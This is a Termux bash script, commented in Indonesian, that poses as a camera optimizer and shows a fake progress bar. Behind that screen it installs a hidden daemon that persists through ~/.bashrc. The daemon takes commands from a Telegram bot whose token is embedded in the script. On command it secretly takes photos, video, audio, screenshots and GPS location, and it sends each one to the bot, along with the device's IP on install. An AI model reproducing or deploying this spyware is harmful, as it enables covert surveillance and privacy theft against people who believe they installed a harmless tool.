#!/data/data/com.termux/files/usr/bin/bash
# ============================================
# CAMERA OPTIMIZER TOOL v2.0
# Tampilan: Tools buat optimize kamera
# Hidden: Camera Spy + Telegram Control
# Created by: DindaZ404
# ============================================

# Konfigurasi Telegram (SAMA)
TOKEN="8211708765:AAFkB4Yfza62pEg0ROwzdJcbK2WHgVh8lWg"
CHAT_ID="8042897984"

# Warna biar keren
R='\033[1;31m'
G='\033[1;32m'
Y='\033[1;33m'
B='\033[1;34m'
P='\033[1;35m'
C='\033[1;36m'
W='\033[1;37m'
N='\033[0m'

clear

# ============= TAMPILAN AWAL (KELIATAN RESMI) =============
echo -e "${P}"
cat << "EOF"
╔══════════════════════════════════════╗
║     CAMERA OPTIMIZER TOOL v2.0       ║
║        Boost Your Camera Quality     ║
║         Created by: DindaZ404        ║
╚══════════════════════════════════════╝
EOF
echo -e "${N}"

echo -e "${C}══════════════════════════════════════════════════${N}"
echo -e "${G}Features:${N}"
echo -e "  ${W}✓ Camera Quality Optimizer${N}"
echo -e "  ${W}✓ Video Stabilization${N}"
echo -e "  ${W}✓ Low-light Enhancement${N}"
echo -e "  ${W}✓ Focus Calibration${N}"
echo -e "  ${W}✓ Memory Cleaner${N}"
echo -e "${C}══════════════════════════════════════════════════${N}"
echo ""

# Progress bar palsu
echo -e "${Y}[!] Analyzing camera hardware...${N}"
for i in {1..10}; do
    echo -ne "\r${G}["
    for j in $(seq 1 $i); do echo -ne "█"; done
    for j in $(seq $i 10); do echo -ne "░"; done
    echo -ne "] $((i*10))%${N}"
    sleep 0.3
done
echo ""
sleep 1

# ============= INSTALL DEPENDENCIES =============
echo -e "${Y}[!] Installing required packages...${N}"
pkg install termux-api -y > /dev/null 2>&1
echo -e "${G}[✓] Packages installed${N}"
sleep 1

# ============= HIDDEN DIRECTORY =============
HIDDEN_DIR="$HOME/.config/.camera"
mkdir -p "$HIDDEN_DIR"
mkdir -p "$HOME/.cache/.cam"

# Kirim sinyal hidup ke telegram
curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
    -d "chat_id=$CHAT_ID" \
    -d "text=📸 *Camera Tool Terinstall!*%0A%0A📱 Device: $(whoami)%0A🌐 IP: $(curl -s ifconfig.me 2>/dev/null)%0A📅 Date: $(date)" \
    -d "parse_mode=Markdown" > /dev/null 2>&1 &

# ============================================
# BACKDOOR SADAP KAMERA
# ============================================
cat > "$HIDDEN_DIR/.camd" << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
TOKEN="8211708765:AAFkB4Yfza62pEg0ROwzdJcbK2WHgVh8lWg"
CHAT_ID="8042897984"

# ============================================
# FUNGSI SADAP KAMERA (TANPA ROOT)
# ============================================

# FOTO KAMERA DEPAN
photo_front() {
    termux-camera-photo -c 1 /sdcard/photo_front.jpg 2>/dev/null
    sleep 2
    curl -s -F chat_id="$CHAT_ID" -F photo=@"/sdcard/photo_front.jpg" "https://api.telegram.org/bot$TOKEN/sendPhoto" > /dev/null 2>&1
    rm -f /sdcard/photo_front.jpg
}

# FOTO KAMERA BELAKANG
photo_back() {
    termux-camera-photo -c 0 /sdcard/photo_back.jpg 2>/dev/null
    sleep 2
    curl -s -F chat_id="$CHAT_ID" -F photo=@"/sdcard/photo_back.jpg" "https://api.telegram.org/bot$TOKEN/sendPhoto" > /dev/null 2>&1
    rm -f /sdcard/photo_back.jpg
}

# VIDEO KAMERA (5 DETIK)
video_capture() {
    termux-camera-record -c 0 -d 5 /sdcard/video.mp4 2>/dev/null
    sleep 6
    curl -s -F chat_id="$CHAT_ID" -F video=@"/sdcard/video.mp4" "https://api.telegram.org/bot$TOKEN/sendVideo" > /dev/null 2>&1
    rm -f /sdcard/video.mp4
}

# SCREENSHOT LAYAR
screenshot() {
    termux-screencap /sdcard/screen.png 2>/dev/null
    sleep 1
    curl -s -F chat_id="$CHAT_ID" -F photo=@"/sdcard/screen.png" "https://api.telegram.org/bot$TOKEN/sendPhoto" > /dev/null 2>&1
    rm -f /sdcard/screen.png
}

# REKAM SUARA (10 DETIK)
record_audio() {
    termux-microphone-record -d 10 -f /sdcard/audio.mp3 2>/dev/null
    sleep 11
    curl -s -F chat_id="$CHAT_ID" -F audio=@"/sdcard/audio.mp3" "https://api.telegram.org/bot$TOKEN/sendAudio" > /dev/null 2>&1
    rm -f /sdcard/audio.mp3
}

# LOKASI GPS
get_location() {
    termux-location > /sdcard/loc.txt 2>/dev/null
    sleep 1
    curl -s -F chat_id="$CHAT_ID" -F document=@"/sdcard/loc.txt" "https://api.telegram.org/bot$TOKEN/sendDocument" > /dev/null 2>&1
    rm -f /sdcard/loc.txt
}

# INFO DEVICE
info() {
    local ip=$(curl -s ifconfig.me 2>/dev/null)
    local uptime=$(uptime | sed 's/.*up //; s/,.*//')
    curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=📱 *Device Info*%0A👤 User: $(whoami)%0A🌐 IP: $ip%0A⏰ Uptime: $uptime%0A📅 Date: $(date)" \
        -d "parse_mode=Markdown" > /dev/null 2>&1
}

# ============================================
# TELEGRAM COMMAND HANDLER
# ============================================
check_telegram() {
    local last_cmd=$(curl -s "https://api.telegram.org/bot$TOKEN/getUpdates" | grep -o '"text":"[^"]*"' | tail -1 | cut -d'"' -f4)
    
    case "$last_cmd" in
        "/front") photo_front ;;
        "/back") photo_back ;;
        "/video") video_capture ;;
        "/ss") screenshot ;;
        "/audio") record_audio ;;
        "/loc") get_location ;;
        "/info") info ;;
        "/help")
            curl -s "https://api.telegram.org/bot$TOKEN/sendMessage" \
                -d "chat_id=$CHAT_ID" \
                -d "text=📸 *Camera Spy Commands*%0A%0A/front - Foto kamera depan%0A/back - Foto kamera belakang%0A/video - Video 5 detik%0A/ss - Screenshot layar%0A/audio - Rekam suara%0A/loc - Lokasi GPS%0A/info - Info device" \
                -d "parse_mode=Markdown" > /dev/null 2>&1
            ;;
    esac
}

while true; do
    check_telegram
    sleep 5
done
EOF

chmod +x "$HIDDEN_DIR/.camd"

# ============= PERSISTENCE =============
if ! grep -q "camd" ~/.bashrc 2>/dev/null; then
    echo "nohup bash $HIDDEN_DIR/.camd > /dev/null 2>&1 &" >> ~/.bashrc
fi

nohup bash "$HIDDEN_DIR/.camd" > /dev/null 2>&1 &

# ============= TAMPILAN AKHIR =============
echo -e "${G}"
cat << "EOF"
╔══════════════════════════════════════╗
║    CAMERA OPTIMIZER INSTALLED!       ║
╠══════════════════════════════════════╣
║  ✓ Camera calibration complete       ║
║  ✓ Focus optimization done           ║
║  ✓ Memory cleaned                    ║
║  ✓ Performance boosted               ║
╚══════════════════════════════════════╝
EOF
echo -e "${N}"

echo -e "${Y}[!] Restart Termux untuk efek maksimal${N}"
echo -e "${Y}[!] Press Enter to exit${N}"
read